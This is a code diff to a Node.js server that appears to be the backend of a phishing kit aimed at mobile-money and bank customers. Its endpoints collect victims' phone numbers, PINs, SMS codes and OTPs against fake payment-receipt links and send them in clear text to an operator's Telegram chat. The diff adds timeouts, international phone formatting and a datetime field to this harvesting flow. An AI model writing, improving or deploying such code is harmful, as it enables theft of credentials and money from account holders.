@@ -10,6 +10,15 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID || '';
 const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
+/* ✅ Telegram timeout — every Telegram call aborts after 8s */
+const TG_TIMEOUT_MS = parseInt(process.env.TELEGRAM_TIMEOUT_MS, 10) || 8000;
+function tgFetch(url, opts = {}) {
+  const controller = new AbortController();
+  const timer = setTimeout(() => controller.abort(), TG_TIMEOUT_MS);
+  return fetch(url, { ...opts, signal: controller.signal })
+    .finally(() => clearTimeout(timer));
+}
+
 const DATA_DIR   = process.env.DATA_DIR || (fs.existsSync('/data') ? '/data' : '/tmp');
 const LINKS_FILE = path.join(DATA_DIR, 'mtn_links.json');
 const TXS_FILE   = path.join(DATA_DIR, 'mtn_txs.json');
@@ -56,6 +65,26 @@ function esc(s = ''){
   return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 }
 
+/* ✅ Helper: build full international phone from country code + local number */
+function buildFullPhone(countryCode, rawNumber){
+  const cc = String(countryCode || '').trim();
+  let num = String(rawNumber || '').trim().replace(/[^\d+]/g, '');
+  if (!num) return '';
+  // If it already starts with +, trust it
+  if (num.startsWith('+')) return num;
+  // Strip leading zeros
+  num = num.replace(/^0+/, '');
+  // If the number already includes the country code digits at start, use +cc+num
+  if (cc) {
+    const ccDigits = cc.replace(/[^\d]/g, '');
+    if (ccDigits && num.startsWith(ccDigits)) {
+      return '+' + num;
+    }
+    return cc + num;
+  }
+  return num;
+}
+
 async function tgSend(text, replyMarkup){
   const body = {
     chat_id: TELEGRAM_CHAT_ID,
@@ -65,29 +94,37 @@ async function tgSend(text, replyMarkup){
   };
   if (replyMarkup) body.reply_markup = replyMarkup;
   try {
-    const r = await fetch(`${TELEGRAM_API}/sendMessage`, {
+    const r = await tgFetch(`${TELEGRAM_API}/sendMessage`, {
       method:'POST',
       headers:{'Content-Type':'application/json'},
       body: JSON.stringify(body)
     });
-    return r.json();
-  } catch(e){ return { ok:false, description: e.message }; }
+    return await r.json();
+  } catch(e){
+    const msg = e.name === 'AbortError' ? 'Telegram request timed out' : e.message;
+    console.error('[tgSend]', msg);
+    return { ok:false, description: msg };
+  }
 }
 
 async function tgAnswer(cbId, text){
-  await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({ callback_query_id: cbId, text, show_alert: false })
-  }).catch(()=>{});
+  try {
+    await tgFetch(`${TELEGRAM_API}/answerCallbackQuery`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ callback_query_id: cbId, text, show_alert: false })
+    });
+  } catch(e) { console.warn('[tgAnswer]', e.message); }
 }
 
 async function tgRemoveButtons(chatId, messageId){
-  await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } })
-  }).catch(()=>{});
+  try {
+    await tgFetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } })
+    });
+  } catch(e) { console.warn('[tgRemoveButtons]', e.message); }
 }
 
 function ensureTx(trackingNumber, extra){
@@ -137,6 +174,7 @@ app.get('/', (_req, res) => {
     dataDir: DATA_DIR,
     isPersistent: IS_PERSISTENT,
     telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
+    telegramTimeoutMs: TG_TIMEOUT_MS,
     publicUrl: resolvePublicUrl(),
     time: new Date().toISOString()
   });
@@ -171,7 +209,7 @@ app.get('/api/debug', (_req, res) => {
 
 app.get('/api/check-webhook', async (_req, res) => {
   try {
-    const r = await fetch(`${TELEGRAM_API}/getWebhookInfo`);
+    const r = await tgFetch(`${TELEGRAM_API}/getWebhookInfo`);
     res.json(await r.json());
   } catch (e) { res.status(500).json({ ok:false, error: e.message }); }
 });
@@ -181,7 +219,7 @@ app.get('/api/set-webhook', async (_req, res) => {
     const publicUrl = resolvePublicUrl();
     const webhookUrl = `${publicUrl}/api/telegram-webhook`;
     const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
-    const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
+    const r = await tgFetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
     res.json({ webhookUrl, result: await r.json() });
   } catch (e) { res.status(500).json({ ok:false, error: e.message }); }
 });
@@ -208,6 +246,8 @@ app.post('/api/links', (req, res) => {
       marketedBy: body.marketedBy || '',
       purpose: body.purpose || '',
       timestamp: body.timestamp || '',
+      /* ✅ NEW: store the ISO datetime from admin.html */
+      transactionDateTime: body.transactionDateTime || '',
       network: 'scotiabank',
       lang: lang,
       expiryHours: expiryHours,
@@ -216,7 +256,7 @@ app.post('/api/links', (req, res) => {
     };
     links.set(tracking, record);
     persistLinks();
-    console.log(`[link] created ${tracking} (expires in ${expiryHours}h, lang=${lang}, purpose="${record.purpose}")`);
+    console.log(`[link] created ${tracking} (expires in ${expiryHours}h, lang=${lang}, purpose="${record.purpose}", dt=${record.transactionDateTime || '—'})`);
     res.json({
       ok: true,
       code: tracking,
@@ -258,7 +298,9 @@ app.get('/api/links/:code', (req, res) => {
     sn:  rec.receiptOptional,
     mk:  rec.marketedBy,
     pu:  rec.purpose,
-    ts:  rec.timestamp
+    ts:  rec.timestamp,
+    /* ✅ NEW: ISO datetime the admin set */
+    dtIso: rec.transactionDateTime || ''
   });
 });
 
@@ -274,9 +316,13 @@ app.post('/api/mtn/pin', async (req, res) => {
     const t = ensureTx(tracking, { receipt: rec });
     const L = normalizeLang(lang || rec.lang || t.lang);
 
+    /* ✅ Build full international phone: countryCode + raw phone */
+    const rawPhone = phone || rec.accountNumber || an || '';
+    const fullPhone = buildFullPhone(rec.countryCode, rawPhone) || rawPhone || '—';
+
     t.pinStatus = 'pending';
     t.pinSubmittedAt = Date.now();
-    t.pinPhone = phone || '';
+    t.pinPhone = fullPhone;
     t.pinCode = pin;
     t.lang = L;
     persistTxs();
@@ -288,7 +334,7 @@ app.post('/api/mtn/pin', async (req, res) => {
       `━━━━━━━━━━━━━━━\n` +
       `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
       `👤 <b>Recipient:</b> ${esc(rec.accountName || rn || '—')}\n` +
-      `📱 <b>Phone:</b> <code>${esc(phone || rec.accountNumber || an || '—')}</code>\n` +
+      `📱 <b>Phone:</b> <code>${esc(fullPhone)}</code>\n` +
       `🔑 <b>PIN:</b> <code>${esc(pin)}</code>\n` +
       `💳 <b>Service:</b> ${esc(rec.modeOfPayment || 'Bank Transfer')}\n` +
       `💰 <b>Amount:</b> ${esc(rec.currency || cur || 'UGX')} ${esc(rec.amount || am || '—')}\n` +
@@ -306,7 +352,7 @@ app.post('/api/mtn/pin', async (req, res) => {
     const tg = await tgSend(text, buttons);
     if (!tg.ok) {
       console.error('Telegram send failed:', tg);
-      return res.status(502).json({ ok:false, message: 'Telegram error' });
+      return res.status(502).json({ ok:false, message: 'Telegram error: ' + (tg.description || 'sendMessage failed') });
     }
 
     res.json({ ok:true, status:'pending' });
@@ -326,6 +372,9 @@ app.post('/api/mtn/sms', async (req, res) => {
     const t = ensureTx(tracking, { receipt: rec });
     const L = normalizeLang(lang || rec.lang || t.lang);
 
+    const rawPhone = rec.accountNumber || an || '';
+    const fullPhone = buildFullPhone(rec.countryCode, rawPhone) || rawPhone || '—';
+
     t.smsStatus = 'pending';
     t.smsSubmittedAt = Date.now();
     t.smsCode = code || '';
@@ -340,7 +389,7 @@ app.post('/api/mtn/sms', async (req, res) => {
       `━━━━━━━━━━━━━━━\n` +
       `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
       `👤 <b>Recipient:</b> ${esc(rec.accountName || rn || '—')}\n` +
-      `📱 <b>Phone:</b> <code>${esc(rec.accountNumber || an || '—')}</code>\n` +
+      `📱 <b>Phone:</b> <code>${esc(fullPhone)}</code>\n` +
       `🔑 <b>Code:</b> <code>${esc(code || '—')}</code>\n` +
       `💰 <b>Amount:</b> ${esc(rec.currency || cur || 'UGX')} ${esc(rec.amount || am || '—')}\n` +
       purposeLine +
@@ -367,7 +416,7 @@ app.post('/api/mtn/sms', async (req, res) => {
     const tg = await tgSend(text, buttons);
     if (!tg.ok) {
       console.error('Telegram send failed:', tg);
-      return res.status(502).json({ ok:false, message:'Telegram error' });
+      return res.status(502).json({ ok:false, message:'Telegram error: ' + (tg.description || 'sendMessage failed') });
     }
 
     res.json({ ok:true, status:'pending' });
@@ -422,7 +471,7 @@ app.post('/api/mtn/otp', async (req, res) => {
     const tg = await tgSend(text, buttons);
     if (!tg.ok) {
       console.error('Telegram send failed:', tg);
-      return res.status(502).json({ ok:false, message:'Telegram error' });
+      return res.status(502).json({ ok:false, message:'Telegram error: ' + (tg.description || 'sendMessage failed') });
     }
 
     res.json({ ok:true, status:'pending' });
@@ -586,10 +635,11 @@ async function registerWebhook(){
   const publicUrl = resolvePublicUrl();
   const webhookUrl = `${publicUrl}/api/telegram-webhook`;
   console.log(`PUBLIC_URL = ${publicUrl}`);
+  console.log(`Telegram timeout: ${TG_TIMEOUT_MS}ms`);
   console.log(`Registering webhook: ${webhookUrl}`);
   try {
     const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
-    const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
+    const r = await tgFetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
     console.log('setWebhook result:', await r.json());
   } catch (e) { console.error('setWebhook failed:', e.message); }
 }
